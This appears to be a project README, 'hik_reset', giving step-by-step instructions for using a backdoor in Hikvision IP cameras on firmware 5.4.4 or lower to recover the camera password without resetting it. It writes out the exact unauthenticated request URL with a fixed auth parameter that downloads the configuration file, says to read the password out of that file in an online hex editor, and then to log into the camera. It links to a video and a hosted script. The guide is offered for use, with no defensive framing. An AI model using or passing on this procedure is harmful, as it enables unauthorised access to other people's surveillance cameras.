# hik_reset
Hikvision backdoor IP camera

Requirements: Ubuntu 18, php 7, Apache, OpenJDK 8

<p><b>You can view the password from the camera without even resetting its settings
<p>List of requirements</b>

<p>1. The firmware version on the camera must be 5.4.4 or lower. Use SADP Tool to check
<p>2. Your PC or laptop must be on the same local network as the camera
<h2>Instructions</h2>

<p>1. Download and install the SADP Tool program on your PC or laptop
<br><a href="https://www.hikvision.com/en/support/tools/destop-tools/sadp-for-windows/#download-agreement" target="_blank" ><b>Download link</b></a>

<p>2. Go to the following IP address in your browser
<br>http://<i><b>camera_ip</i></b>/System/configurationFile?auth=YWRtaW46MTEK
<br>Where, camera_ip - IP address of the camera. You can find out IP using the <a href="https://www.hikvision.com/en/support/tools/destop-tools/sadp-for-windows/#download-agreement" target="_blank" ><b>SADP program</b></a>



<p>3. The file that you downloaded from the server (the file will have the name 6bf2bc3e2e31b280d83051dfa7444e22plaintextOutput, the name changes every time) should be uploaded to the site with the online HEX editor
<br><a href="https://hexed.it/" target="_blank" ><b>https://hexed.it</b></a>
<p>4.Use the camera web interface and Internet Explorer to enter the camera

Manual
https://www.youtube.com/embed/4PJXuYcMjMY

<b><center>An example of the script
http://h.cctv-world.space/en.html
